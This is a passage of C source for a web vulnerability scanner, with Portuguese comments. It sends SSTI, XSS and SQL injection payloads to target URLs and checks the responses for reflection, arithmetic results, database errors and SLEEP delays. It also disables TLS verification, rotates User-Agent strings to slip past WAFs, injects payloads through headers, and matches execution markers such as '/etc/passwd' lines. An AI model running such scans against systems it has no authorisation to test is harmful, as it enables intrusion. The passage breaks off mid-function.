#define UA_POOL_SIZE 15

/* Retorna UA aleatório do pool */
static const char *rand_ua(void) {
    static unsigned int _seed = 0;
    if (_seed == 0) _seed = (unsigned int)time(NULL);
    _seed = _seed * 1103515245 + 12345;
    return g_ua_pool[(_seed >> 16) % UA_POOL_SIZE];
}

static void *test_worker_ssti(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;
    char enc[512]; url_encode(ta->payload, enc, sizeof(enc));
    char url[2048]; snprintf(url, sizeof(url), "%s%s", ta->target, enc);

    WorkBuf wb = {0}; wb.buf = malloc(8192); wb.cap = 8192;
    if(!wb.buf){ free(ta); return NULL; }

    CURL *ch = curl_easy_init();
    if(ch){
        curl_easy_setopt(ch, CURLOPT_URL, url);
        curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION, worker_write_cb);
        curl_easy_setopt(ch, CURLOPT_WRITEDATA, &wb);
        curl_easy_setopt(ch, CURLOPT_TIMEOUT, (long)ta->timeout);
        curl_easy_setopt(ch, CURLOPT_CONNECTTIMEOUT, 5L);
        curl_easy_setopt(ch, CURLOPT_MAXFILESIZE, (long)65536); /* cap 64KB */
        curl_easy_setopt(ch, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(ch, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(ch, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(ch, CURLOPT_MAXREDIRS, 3L);
        curl_easy_setopt(ch, CURLOPT_USERAGENT, (ta->waf_type > 0) ? rand_ua() : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        CURLcode rc = curl_easy_perform(ch);
        curl_easy_cleanup(ch);
        if(rc == CURLE_OK && wb.len > 0) {
            /* SSTI detection:
             * Estratégia: procura resultados matemáticos específicos dos payloads.
             * Para {{7*7}} → procura "49" mas só se isolado (não dentro de outro número)
             * Para {{7*'7'}} → procura "7777777"
             * Para {{7+7}} → procura "14" isolado
             * Outros indicadores concretos de execução */
            int hit = 0;
            char resp_lower[8192]={0};
            int rl=wb.len<8191?(int)wb.len:8191;
            for(int i=0;i<rl;i++) resp_lower[i]=(char)tolower((unsigned char)wb.buf[i]);

            /* Marca qual payload estamos testando */
            int is_mult  = (strstr(ta->payload,"7*7")   != NULL);
            int is_str7  = (strstr(ta->payload,"7*'7'") != NULL || strstr(ta->payload,"7*\"7\"") != NULL);
            int is_add   = (strstr(ta->payload,"7+7")   != NULL);

            if(is_mult && !is_str7) {
                /* Resultado de 7*7=49: precisa de "49" isolado (não ser "149","497",...) */
                char *p49 = resp_lower;
                while((p49 = strstr(p49, "49")) != NULL) {
                    char before = (p49 > resp_lower) ? *(p49-1) : ' ';
                    char after  = *(p49+2);
                    int b_digit = (before>='0'&&before<='9');
                    int a_digit = (after>='0'&&after<='9');
                    if(!b_digit && !a_digit) { hit=1; break; }
                    p49 += 2;
                }
            }
            if(!hit && is_str7) {
                if(strstr(resp_lower,"7777777")) hit=1;
            }
            if(!hit && is_add) {
                /* 7+7=14: precisa de "14" isolado */
                char *p14 = resp_lower;
                while((p14 = strstr(p14, "14")) != NULL) {
                    char before = (p14 > resp_lower) ? *(p14-1) : ' ';
                    char after  = *(p14+2);
                    if(!(before>='0'&&before<='9') && !(after>='0'&&after<='9')) { hit=1; break; }
                    p14 += 2;
                }
            }
            /* Indicadores de execução de código (alta confiança) */
            if(!hit) {
                const char *exec_markers[] = {
                    "7777777",           /* Jinja2 {{7*'7'}} */
                    "uid=0(",            /* id como root */
                    "uid=33(",           /* www-data */
                    "root:x:0:0",        /* /etc/passwd */
                    "/bin/bash",         /* /etc/passwd line */
                    "templatesyntaxerror",
                    "parseexception",    /* Java template errors */
                    "freemarker.core",   /* Freemarker stack */
                    "velocity engine",
                    NULL
                };
                for(int mi=0; exec_markers[mi]; mi++) {
                    if(strstr(resp_lower, exec_markers[mi])) { hit=1; break; }
                }
            }
            if(hit) {
                /* Fingerprint da engine pelo resultado */
                const char *engine = "unknown";
                if(strstr(resp_lower,"7777777")) {
                    engine = "Jinja2 (Python/Flask)";  /* só Jinja2 faz 7*'7'='7777777' */
                } else if(strstr(ta->payload,"#set($x=7*7)")) {
                    engine = "Velocity (Java)";
                } else if(strstr(ta->payload,"{$smarty")) {
                    engine = "Smarty (PHP)";
                } else if(strstr(ta->payload,"<%= 7*7 %>")) {
                    engine = "ERB (Ruby)";
                } else if(strstr(ta->payload,"${7*7}")) {
                    if(strstr(resp_lower,"freemarker")) engine="Freemarker (Java)";
                    else engine = "Freemarker/Velocity/Thymeleaf (Java)";
                } else if(strstr(ta->payload,"{{7*7}}")) {
                    engine = "Jinja2/Twig/Handlebars (detecte com {{7*'7'}})";
                } else if(strstr(resp_lower,"templatesyntaxerror")) {
                    engine = "Jinja2 (Python) — erro de sintaxe exposto";
                } else if(strstr(resp_lower,"freemarker.core")) {
                    engine = "Freemarker (Java)";
                } else if(strstr(resp_lower,"velocity engine")) {
                    engine = "Velocity (Java)";
                }
                printf("\033[1;31m  [✓ SSTI] %s\033[0m\n", ta->payload);
                printf("  \033[1;33m  → Engine provável: %s\033[0m\n", engine);
                char ssti_ev[256];
                snprintf(ssti_ev,255,"engine=%s payload=%.100s",engine,ta->payload);
                vuln_register("SSTI",ta->target,ta->payload,ssti_ev,3,95);
                found_register(ta->payload);
            }
        }
    }
    free(wb.buf); free(ta); return NULL;
}


/* ══════════════════════════════════════════════════════════════════
 * resp_waf_classify — detecta resposta de WAF/CDN/challenge
 * Retorna:
   *   0 (RBLK_NONE)       — resposta normal da aplicação
   *   1 (RBLK_BLOCK)      — bloqueio genérico (403 curto, fingerprint)
   *   2 (RBLK_CF_JS)      — Cloudflare JS challenge (__cf_chl_opt, etc.)
   *   3 (RBLK_CF_CAPTCHA) — Cloudflare interstitial / CAPTCHA
 * Usado por: test_worker_xss, nosql_analyze
 * ══════════════════════════════════════════════════════════════════ */
#define RBLK_NONE       0
#define RBLK_BLOCK      1
#define RBLK_CF_JS      2
#define RBLK_CF_CAPTCHA 3

static int resp_waf_classify(const char *body, size_t bsz, long code) {
    if(!body || bsz==0) return RBLK_NONE;
    /* Cloudflare JS challenge — variáveis exclusivas do mecanismo */
    if(memmem(body,bsz,"__cf_chl_opt",12) ||
       memmem(body,bsz,"cf_chl_prog",  11) ||
       memmem(body,bsz,"chl_opt",       7) ||
       memmem(body,bsz,"cf-challenge", 12)) {
        return RBLK_CF_JS;
    }
    /* Cloudflare interstitial / CAPTCHA */
    if((memmem(body,bsz,"cloudflare",10)||memmem(body,bsz,"Cloudflare",10)) &&
       (memmem(body,bsz,"Ray ID",6)||memmem(body,bsz,"captcha",7)||
        memmem(body,bsz,"challenge",9))) {
        return RBLK_CF_CAPTCHA;
    }
    /* Bloqueio genérico: 403/429 com corpo pequeno */
    if((code==403||code==429) && bsz<2048) return RBLK_BLOCK;
    /* Fingerprints genéricos de WAF */
    if(memmem(body,bsz,"Access denied",13)        ||
       memmem(body,bsz,"Request blocked",15)       ||
       memmem(body,bsz,"Your IP address has been",24)) return RBLK_BLOCK;
    return RBLK_NONE;
}

static void *test_worker_xss(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;

    /* ── Filtro de endpoint de infraestrutura Cloudflare ─────────────────
     * Esses endpoints pertencem ao mecanismo de challenge do CF e NUNCA
     * refletem input do usuário. Testar gera exclusivamente FP.           */
    if(strstr(ta->target,"__cf_chl")   ||
       strstr(ta->target,"cdn-cgi/")   ||
       strstr(ta->target,"cf_chl_prog")) {
        free(ta); return NULL;
    }

    char enc[512]; url_encode(ta->payload, enc, sizeof(enc));
    char url[2048]; snprintf(url, sizeof(url), "%s%s", ta->target, enc);

    WorkBuf wb = {0}; wb.buf = malloc(65536); wb.cap = 65536;
    if(!wb.buf){ free(ta); return NULL; }

    CURL *ch = curl_easy_init();
    if(!ch){ free(wb.buf); free(ta); return NULL; }
    curl_easy_setopt(ch, CURLOPT_URL, url);
    curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION, worker_write_cb);
    curl_easy_setopt(ch, CURLOPT_WRITEDATA, &wb);
    curl_easy_setopt(ch, CURLOPT_TIMEOUT, (long)ta->timeout);
    curl_easy_setopt(ch, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(ch, CURLOPT_MAXFILESIZE, 131072L);
    curl_easy_setopt(ch, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(ch, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(ch, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(ch, CURLOPT_MAXREDIRS, 3L);
    curl_easy_setopt(ch, CURLOPT_USERAGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124");
    CURLcode rc = curl_easy_perform(ch);
    long http_code = 0;
    curl_easy_getinfo(ch, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(ch);

    if(rc != CURLE_OK || wb.len == 0){ free(wb.buf); free(ta); return NULL; }

    /* ── WAF/challenge detection na resposta ─────────────────────────────
     * Se a resposta É um challenge do Cloudflare ou bloqueio de WAF,
     * o body não reflete input do usuário → INCONCLUSIVE, não analisa.   */
    if(resp_waf_classify(wb.buf, wb.len, http_code) >= RBLK_CF_JS) {
        free(wb.buf); free(ta); return NULL;
    }
    /* 403/429 curto = WAF block genérico — também skip */
    if((http_code==403||http_code==429) && wb.len < 2048) {
        free(wb.buf); free(ta); return NULL;
    }

    const char *body = wb.buf;
    size_t blen = wb.len;

    /* ══════════════════════════════════════════════════════════════════
     * XSS Detection — Nível Burp Suite
     *
     * REGRA: payload precisa estar refletido em contexto EXECUTÁVEL.
     * Não basta aparecer no body — precisa estar num contexto onde
     * o browser executa JS. Falso positivo mais comum: payload dentro
     * de valor de atributo inerte (class=, id=, data-*) ou em comentário.
     *
     * CONTEXTOS verificados:
     *   SCRIPT  — entre <script>...</script> sem encode
     *   EVENTO  — em atributo de evento (onerror=, onload=, etc.)
     *   HREF_JS — em href="javascript:..."
     *   TAG     — como nova tag HTML com atributo de execução
     *   ATTR    — em atributo com quebra de contexto (fecha aspas + evento)
     *
     * CONFIRMAÇÃO DUPLA para contextos ambíguos:
     *   Se payload aparece em atributo inerte → não registra.
     *   Se payload aparece em múltiplos locais → pelo menos 1 executável.
     * ══════════════════════════════════════════════════════════════════ */

    /* PASSO 1: payload literal está no body? */
    const char *hit = strcasestr(body, ta->payload);
    if(!hit){ free(wb.buf); free(ta); return NULL; }

    /* ── PASSO 1b: check de pre-existência — evita FP com conteúdo da página ──
     *
     * CAUSA RAIZ do falso positivo:
     *   target=http://site.com/?param=   payload=<script>alert(1)</script>
     *   A página do Cloudflare challenge JÁ tem <script> no HTML próprio.
     *   strcasestr(body, "<script") acha a tag da página, não o reflexo.
     *   O scanner reporta CONFIRMED erroneamente.
     *
     * FIX: busca o payload na página BASE (sem injeção). Se já existe lá,
     *      é conteúdo da própria página — não é reflexo → descarta (FP).
     * ──────────────────────────────────────────────────────────────────── */
    {
        WorkBuf wb2={0}; wb2.buf=malloc(32768); wb2.cap=32768;
        int pre_exists=0, base_is_waf=0;
        if(wb2.buf) {
            CURL *ch2=curl_easy_init();
            if(ch2) {
                long bcode2=0;
                curl_easy_setopt(ch2,CURLOPT_URL,         ta->target);
                curl_easy_setopt(ch2,CURLOPT_WRITEFUNCTION,worker_write_cb);
                curl_easy_setopt(ch2,CURLOPT_WRITEDATA,   &wb2);
                curl_easy_setopt(ch2,CURLOPT_TIMEOUT,     5L);
                curl_easy_setopt(ch2,CURLOPT_CONNECTTIMEOUT,4L);
                curl_easy_setopt(ch2,CURLOPT_SSL_VERIFYPEER,0L);
                curl_easy_setopt(ch2,CURLOPT_FOLLOWLOCATION,1L);
                curl_easy_setopt(ch2,CURLOPT_MAXREDIRS,   2L);
                curl_easy_setopt(ch2,CURLOPT_USERAGENT,
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124");
                curl_easy_perform(ch2);
                curl_easy_getinfo(ch2,CURLINFO_RESPONSE_CODE,&bcode2);
                curl_easy_cleanup(ch2);
                if(wb2.buf && wb2.len>0) {
                    /* payload JÁ existe no baseline? → FP */
                    pre_exists=(strcasestr(wb2.buf,ta->payload)!=NULL);
                    /* baseline é WAF/challenge? → INCONCLUSIVE */
                    base_is_waf=(resp_waf_classify(wb2.buf,wb2.len,bcode2)>=RBLK_BLOCK ||
                                 bcode2==403||bcode2==429);
                }
            }
            free(wb2.buf);
        }
        if(pre_exists||base_is_waf){
            free(wb.buf); free(ta); return NULL;
        }
    }

    /* PASSO 2: HTML-encoding — payload codificado e literal ausente = FP */
    if(strstr(ta->payload,"<") || strstr(ta->payload,">") || strstr(ta->payload,"\"")) {
        char enc_full[2048]={0}; int ei=0;
        const char *pp=ta->payload;
        while(*pp && ei<2040){
            if     (*pp=='<'){enc_full[ei++]='&';enc_full[ei++]='l';enc_full[ei++]='t';enc_full[ei++]=';';}
            else if(*pp=='>'){enc_full[ei++]='&';enc_full[ei++]='g';enc_full[ei++]='t';enc_full[ei++]=';';}
            else if(*pp=='"'){enc_full[ei++]='&';enc_full[ei++]='q';enc_full[ei++]='u';enc_full[ei++]='o';enc_full[ei++]='t';enc_full[ei++]=';';}
            else if(*pp=='\''){enc_full[ei++]='&';enc_full[ei++]='#';enc_full[ei++]='3';enc_full[ei++]='9';enc_full[ei++]=';';}
            else enc_full[ei++]=*pp;
            pp++;
        }
        enc_full[ei]='\0';
        if(ei>4 && buf_icontains(body,blen,enc_full) && !buf_icontains(body,blen,ta->payload)){
            free(wb.buf); free(ta); return NULL;
        }
        /* Verifica também escape parcial: &lt; sem &gt; = encoding incompleto mas presente */
        if(buf_icontains(body,blen,"&lt;") && buf_icontains(body,blen,"&gt;") &&
           !buf_icontains(body,blen,"<script") && !buf_icontains(body,blen,"<img")){
            /* Provável encoding — verifica se hit está encodado */
            if(strncmp(hit,"&lt;",4)==0){ free(wb.buf); free(ta); return NULL; }
        }
    }

    /* PASSO 3: em comentário HTML? */
    {
        int in_cmt=0; const char *p=body;
        while(p<hit){
            if(strncmp(p,"<!--",4)==0){in_cmt=1;p+=4;continue;}
            if(strncmp(p,"-->",3)==0) {in_cmt=0;p+=3;continue;}
            p++;
        }
        if(in_cmt){ free(wb.buf); free(ta); return NULL; }
    }

    /* PASSO 4: análise de contexto de execução
     *
     * Determina onde exatamente o payload está no HTML.
     * Cada contexto tem critério diferente de "executável". */
    int confirmed=0; int xss_type=0;
    const char *xss_label="";

    /* — Contexto SCRIPT: payload dentro de bloco <script> */
    if(!confirmed && strstr(ta->payload,"<script")){
        if(strncasecmp(hit,"<script",7)==0){
            /* Verifica que não é <script> encodado */
            if(hit[0]=='<'){ confirmed=1; xss_type=1; xss_label="script"; }
        }
    }

    /* — Contexto EVENTO: payload em atributo de evento JS */
    if(!confirmed){
        const char *evts[]={"onerror=","onload=","onfocus=","ontoggle=","onmouseover=",
            "onstart=","onclick=","oninput=","onkeydown=","onmouseenter=","onanimationstart=",
            "onbegin=","onpointerdown=","ontouchstart=","onhashchange=","onpageshow=",NULL};
        for(int e=0; evts[e]&&!confirmed; e++){
            if(!strstr(ta->payload,evts[e])) continue;
            const char *ev_hit=strcasestr(hit,evts[e]);
            if(!ev_hit) continue;
            /* Volta para encontrar a < que abre a tag */
            const char *back=ev_hit-1;
            while(back>=body && (ev_hit-back)<512){
                if(*back=='<' && *(back+1)!='!'){ confirmed=1; xss_type=2; xss_label="evento"; break; }
                if(*back=='>') break;
                back--;
            }
        }
    }

    /* — Contexto HREF/SRC javascript: */
    if(!confirmed && strstr(ta->payload,"javascript:")){
        const char *js_hit=strcasestr(body,"javascript:");
        if(js_hit){
            /* Deve ter href= ou src= antes */
            const char *back=js_hit-1;
            while(back>body&&(*back=='"'||*back=='\''||*back==' '))back--;
            if(strncasecmp(back-4,"href=",5)==0 || strncasecmp(back-3,"src=",4)==0 ||
               strncasecmp(back-6,"action=",7)==0){
                confirmed=1; xss_type=3; xss_label="href-js";
            }
        }
    }

    /* — Contexto TAG: nova tag HTML executável refletida */
    if(!confirmed && strstr(ta->payload,"<") && hit[0]=='<' && hit[1]!='!'){
        /* Tag com mecanismo de execução */
        if(strstr(ta->payload,"src=") && (strstr(ta->payload,"<img") ||
           strstr(ta->payload,"<iframe") || strstr(ta->payload,"<input"))){
            confirmed=1; xss_type=4; xss_label="tag-src";
        }
        else if(strstr(ta->payload,"<svg") || strstr(ta->payload,"<math")){
            /* SVG/MathML — contexto especial para bypass de filtros */
            if(strstr(ta->payload,"alert") || strstr(ta->payload,"confirm") ||
               strstr(ta->payload,"prompt") || strstr(ta->payload,"onerror")){
                confirmed=1; xss_type=4; xss_label="tag-svg";
            }
        }
    }

    /* — Contexto ATRIBUTO com quebra de contexto:
     * Ex: payload fecha aspas e injeta evento: "><script>alert(1)</script>
     * O payload aparece fechando um atributo (antes tem ") */
    if(!confirmed && strstr(ta->payload,"\">") && strstr(ta->payload,"<")){
        /* Verifica que hit fecha atributo e abre nova tag */
        if(hit[0]=='"' || hit[0]=='\''){
            confirmed=1; xss_type=5; xss_label="attr-break";
        }
    }

    /* — Contexto SCRIPT-STRING: payload dentro de string JS em <script> existente
     * Ex: var q="PAYLOAD" onde payload fecha a string com "; alert(1);//" */
    if(!confirmed && (strstr(ta->payload,"alert") || strstr(ta->payload,"confirm") ||
                      strstr(ta->payload,"prompt"))){
        /* Verifica se hit está dentro de <script>...</script> */
        const char *script_start=body;
        while((script_start=strcasestr(script_start,"<script"))!=NULL){
            const char *script_end=strcasestr(script_start,"</script>");
            if(!script_end) break;
            if(hit>script_start && hit<script_end){
                /* Payload está dentro de bloco script — executável se não em comentário JS */
                int in_js_cmt=0;
                const char *sp=script_start;
                while(sp<hit){
                    if(strncmp(sp,"//",2)==0){
                        const char *nl=strchr(sp,'\n'); if(!nl) nl=sp+strlen(sp);
                        if(hit<nl){ in_js_cmt=1; break; }
                        sp=nl; continue;
                    }
                    if(strncmp(sp,"/*",2)==0){
                        const char *ec=strstr(sp,"*/");
                        if(ec&&hit<ec){ in_js_cmt=1; break; }
                        sp=ec?ec+2:sp+1; continue;
                    }
                    sp++;
                }
                if(!in_js_cmt){ confirmed=1; xss_type=6; xss_label="script-str"; }
            }
            script_start=script_end+9;
        }
    }

    if(confirmed){
        const char *lbl = xss_type==1?"script":xss_type==2?"evento":
                          xss_type==3?"href-js":xss_type==5?"attr-break":
                          xss_type==6?"script-str":"tag-html";
        printf("\033[1;31m  [✓ XSS/%s] %s\033[0m\n", lbl, ta->payload);
        char evidence[256]={0};
        snprintf(evidence,sizeof(evidence),"ctx=%s payload=%.150s",lbl,ta->payload);
        vuln_register("XSS", ta->target, ta->payload, evidence, 3, 90);
    }

    /* ── Header injection: XSS via User-Agent / Referer / X-Forwarded-For ────
     * Muitos backends logam e refletem esses headers em páginas de erro/debug.
     * Só testa se o payload cabe no header (sem \n ou \r) e é curto (<180 chars).
     * ─────────────────────────────────────────────────────────────────────── */
    if(!confirmed && strlen(ta->payload) < 180) {
        int pl_safe=1;
        for(int _pi=0;ta->payload[_pi]&&_pi<180;_pi++){
            if(ta->payload[_pi]=='\n'||ta->payload[_pi]=='\r'){pl_safe=0;break;}
        }
        if(pl_safe) {
            const char *hdr_names[]={"User-Agent","Referer","X-Forwarded-For",
                                     "X-Real-IP","X-Custom-IP-Authorization",
                                     "X-Originating-IP","X-Remote-IP",NULL};
            for(int _hi=0; hdr_names[_hi]; _hi++) {
                CURL *_hch=curl_easy_init(); if(!_hch) continue;
                WorkBuf _hwb={0}; _hwb.buf=malloc(32768); _hwb.cap=32768;
                if(!_hwb.buf){curl_easy_cleanup(_hch);continue;}
                struct curl_slist *_hhdrs=NULL;
                char _hhdr[512]; snprintf(_hhdr,511,"%s: %s",hdr_names[_hi],ta->payload);
                _hhdrs=curl_slist_append(_hhdrs,_hhdr);
                /* UA padrão nos outros headers */
                if(strcmp(hdr_names[_hi],"User-Agent")!=0)
                    _hhdrs=curl_slist_append(_hhdrs,"User-Agent: Mozilla/5.0");
                curl_easy_setopt(_hch,CURLOPT_URL,ta->target);
                curl_easy_setopt(_hch,CURLOPT_HTTPHEADER,_hhdrs);
                curl_easy_setopt(_hch,CURLOPT_WRITEFUNCTION,worker_write_cb);
                curl_easy_setopt(_hch,CURLOPT_WRITEDATA,&_hwb);
                curl_easy_setopt(_hch,CURLOPT_TIMEOUT,6L);
                curl_easy_setopt(_hch,CURLOPT_CONNECTTIMEOUT,4L);
                curl_easy_setopt(_hch,CURLOPT_SSL_VERIFYPEER,0L);
                curl_easy_setopt(_hch,CURLOPT_FOLLOWLOCATION,1L);
                curl_easy_perform(_hch);
                curl_slist_free_all(_hhdrs); curl_easy_cleanup(_hch);
                if(_hwb.buf && _hwb.len > 0) {
                    /* ── Header injection: verifica se o PAYLOAD COMPLETO está refletido.
                     *
                     * Bug anterior: checava apenas se "<script" ou "onerror=" aparecia
                     * EM QUALQUER LUGAR na resposta. Toda página com JS próprio disparava
                     * FP, pois qualquer resposta com <script> na estrutura HTML era
                     * marcada como CONFIRMED.
                     *
                     * Fix: procura o payload COMPLETO no body. Reflexo de header injeta
                     * todo o valor enviado — se só aparecer substring genérica, não é
                     * reflexo real. Payloads muito curtos (<12 chars) são descartados
                     * pois têm probabilidade alta de colisão com HTML da página.        */
                    size_t _plen = strlen(ta->payload);
                    int _ref = (_plen >= 12) &&
                               (_hwb.buf!=NULL) &&
                               (memmem(_hwb.buf,_hwb.len,ta->payload,_plen)!=NULL);
                    int _esc = memmem(_hwb.buf,_hwb.len,"&lt;",4)!=NULL ||
                               memmem(_hwb.buf,_hwb.len,"&#60;",5)!=NULL;
                    if(_ref && !_esc) {
                        char _hev[256];
                        snprintf(_hev,255,"XSS-via-header: %s payload completo refletido sem escape",hdr_names[_hi]);
                        vuln_register("XSS",ta->target,ta->payload,_hev,3,85);
                        printf("\033[1;31m  [✓ XSS/header/%s] %s\033[0m\n",hdr_names[_hi],ta->payload);
                    }
                }
                free(_hwb.buf);
            }
        }
    }

    free(wb.buf); free(ta); return NULL;
}

static char *agent_decode_unicode(const char *src, char *dst, size_t dstsz) {
    size_t si=0, di=0, slen=strlen(src);
    while (si<slen && di<dstsz-1) {
        if (src[si]=='\\'&&src[si+1]=='u'&&
            isxdigit((unsigned char)src[si+2])&&isxdigit((unsigned char)src[si+3])&&
            isxdigit((unsigned char)src[si+4])&&isxdigit((unsigned char)src[si+5])) {
            char hex[5]={src[si+2],src[si+3],src[si+4],src[si+5],0};
            unsigned int cp=(unsigned int)strtol(hex,NULL,16); si+=6;
            if(cp<0x80&&cp>0)     { dst[di++]=(char)cp; }
            else if(cp<0x800)     { dst[di++]=(char)(0xC0|(cp>>6)); dst[di++]=(char)(0x80|(cp&0x3F)); }
            else                  { dst[di++]='?'; }
        } else { dst[di++]=src[si++]; }
    }
    dst[di]='\0';
    return dst;
}

/* Normaliza resposta HTTP removendo tokens dinâmicos antes de comparar.
 * Remove: csrf, nonce, _token, viewstate, sequências numéricas >= 8 dígitos.
 * Evita falsos positivos por conteúdo variável (timestamps, session IDs). */
static void sqli_normalize(char *dst, const char *src, size_t dstsz) {
    size_t si=0, di=0, ss=strlen(src);
    while (si<ss && di<dstsz-1) {
        /* Tokens dinâmicos comuns */
        if (strncasecmp(src+si,"csrf",4)==0    || strncasecmp(src+si,"nonce",5)==0  ||
            strncasecmp(src+si,"_token",6)==0  || strncasecmp(src+si,"viewstate",9)==0) {
            while(si<ss && src[si]!='"' && src[si]!='\'' && src[si]!=' ' && src[si]!='>') si++;
            dst[di++]='X'; continue;
        }
        /* Sequências numéricas longas (timestamps, IDs de sessão) */
        if (isdigit((unsigned char)src[si])) {
            size_t num_start=si, dc=0;
            while(si<ss && isdigit((unsigned char)src[si])){si++;dc++;}
            if (dc>=8) { dst[di++]='N'; continue; } /* substitui longo por N */
            /* Número curto: copia normalmente */
            while(num_start<si && di<dstsz-1) dst[di++]=src[num_start++];
            continue;
        }
        dst[di++]=src[si++];
    }
    dst[di]='\0';
}

static void *test_worker_sqli(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;

    /* ══════════════════════════════════════════════════════════════════
     * SQLi Detection v4 — Boolean-First + Multi-Signal
     *
     * REGRA PRINCIPAL: boolean TRUE vs FALSE é o critério central.
     * Comparação canônica disparada para TODO payload, não só booleanos.
     *
     * Sinais disponíveis:
     *   [B] Boolean diff  — TRUE vs FALSE (body diff)              +40 pts
     *   [E] Error-based   — mensagem específica de banco           +50 pts
     *   [T] Time-based    — SLEEP confirmado 3x vs baseline        +60 pts
     *   [H] HTTP 500 + DB — código HTTP + conteúdo de DB           +30 pts
     *   [C] Content-Len   — Content-Length header TRUE≠FALSE       +20 pts
     *   [S] Status diff   — HTTP code mudou TRUE→FALSE             +20 pts
     *
     * Regras de classificação:
     *   boolean + cl/error/status  → ❌ CONFIRMADO
     *   time + qualquer sinal      → ❌ CONFIRMADO
     *   3+ sinais                  → ❌ CONFIRMADO
     *   2 sinais (sem cl sozinho)  → ⚠  PROVÁVEL
     *   cl sozinho                 → ○  SUSPEITO (não registra)
     *   1 sinal                    → ○  SUSPEITO (não registra)
     *
     * Thresholds boolean:
     *   body diff  > 20 bytes  E  > 5%  → sig_boolean
     *   CL header  > 20 bytes           → sig_cl
     *   TRUE > FALSE obrigatório
     * ══════════════════════════════════════════════════════════════════ */

    char enc[512]; url_encode(ta->payload, enc, sizeof(enc));
    char url_payload[2048]; snprintf(url_payload,sizeof(url_payload),"%s%s",ta->target,enc);
    char url_benign[2048];  snprintf(url_benign, sizeof(url_benign), "%s1", ta->target);

    /* Score e contagem de sinais independentes */
    int score       = 0;
    int n_signals   = 0; /* número de sinais distintos */
    int sig_error   = 0, sig_boolean = 0, sig_time = 0;
    int sig_http    = 0, sig_cl      = 0, sig_status = 0;
    const char *sqli_db   = "";
    const char *sqli_type = "?";

    /* Tipo do payload */
    int is_time_pl = strstr(ta->payload,"SLEEP(")    || strstr(ta->payload,"sleep(")   ||
                     strstr(ta->payload,"WAITFOR ")   || strstr(ta->payload,"pg_sleep") ||
                     strstr(ta->payload,"BENCHMARK(") || strstr(ta->payload,"benchmark(");
    int is_true_pl = strstr(ta->payload," AND 1=1")  || strstr(ta->payload," OR 1=1")  ||
                     strstr(ta->payload,"OR/**/1=1")  || strstr(ta->payload,"'='1")     ||
                     strstr(ta->payload,"' AND '1'='1");
    int is_false_pl= strstr(ta->payload," AND 1=2")  || strstr(ta->payload," OR 1=2")  ||
                     strstr(ta->payload,"AND 1=0")    || strstr(ta->payload,"'='2")     ||
                     strstr(ta->payload,"' AND '1'='2");
    int has_quote  = strstr(ta->payload,"'") || strstr(ta->payload,"\"") ||
                     strstr(ta->payload,"--") || strstr(ta->payload,"/*");

    /* ════════════════════════════════════════════════════════════════
     * BLOCO 1 — TIME-BASED com baseline e 3 confirmações
     * ════════════════════════════════════════════════════════════════ */
    if (is_time_pl) {
        int expected = 5;
        const char *sp = strstr(ta->payload,"SLEEP("); if(!sp) sp=strstr(ta->payload,"sleep(");
        if(sp) expected=atoi(sp+6);
        const char *wp = strstr(ta->payload,"DELAY '0:0:"); if(wp) expected=atoi(wp+11);
        if(expected<1) expected=5; if(expected>30) expected=30;

        /* Timeout inteligente: expected + 2× jitter de rede máximo esperado
         * Usa 3× o baseline para detectar rede lenta e não confundir com SLEEP */
        struct timeval t0,t1;

        /* Mede baseline 2x e usa a média para detectar rede lenta */
        double baseline[2]={0,0};
        for(int bi=0;bi<2;bi++){
            CURL *cb=curl_easy_init(); if(!cb) continue;
            WorkBuf wb0={0}; wb0.buf=malloc(256); wb0.cap=256;
            curl_easy_setopt(cb,CURLOPT_URL,url_benign);
            curl_easy_setopt(cb,CURLOPT_WRITEFUNCTION,worker_write_cb);
            curl_easy_setopt(cb,CURLOPT_WRITEDATA,&wb0);
            curl_easy_setopt(cb,CURLOPT_TIMEOUT,8L);
            curl_easy_setopt(cb,CURLOPT_CONNECTTIMEOUT,4L);
            curl_easy_setopt(cb,CURLOPT_SSL_VERIFYPEER,0L);
            curl_easy_setopt(cb,CURLOPT_FOLLOWLOCATION,0L);
            gettimeofday(&t0,NULL);
            curl_easy_perform(cb);
            gettimeofday(&t1,NULL);
            curl_easy_cleanup(cb); free(wb0.buf);
            baseline[bi]=(t1.tv_sec-t0.tv_sec)+(t1.tv_usec-t0.tv_usec)/1e6;
        }
        double base_avg = (baseline[0]+baseline[1])/2.0;
        /* Threshold: payload deve demorar pelo menos expected*0.75 E
         * pelo menos 3× o baseline médio (filtra rede lenta) */
        double min_expected  = expected * 0.75;
        double min_vs_base   = base_avg * 3.0;
        double min_threshold = min_expected > min_vs_base ? min_expected : min_vs_base;
        long timeout_smart   = (long)(expected + (long)(base_avg*2) + 8);

        /* 3 tentativas — precisa de pelo menos 2 confirmadas */
        int confirmed = 0;
        for(int att=0;att<3;att++){
            CURL *ch=curl_easy_init(); if(!ch) continue;
            WorkBuf wb={0}; wb.buf=malloc(256); wb.cap=256;
            curl_easy_setopt(ch,CURLOPT_URL,url_payload);
            curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
            curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
            curl_easy_setopt(ch,CURLOPT_TIMEOUT,timeout_smart);
            curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
            curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
            curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,0L);
            curl_easy_setopt(ch,CURLOPT_USERAGENT,rand_ua());
            gettimeofday(&t0,NULL);
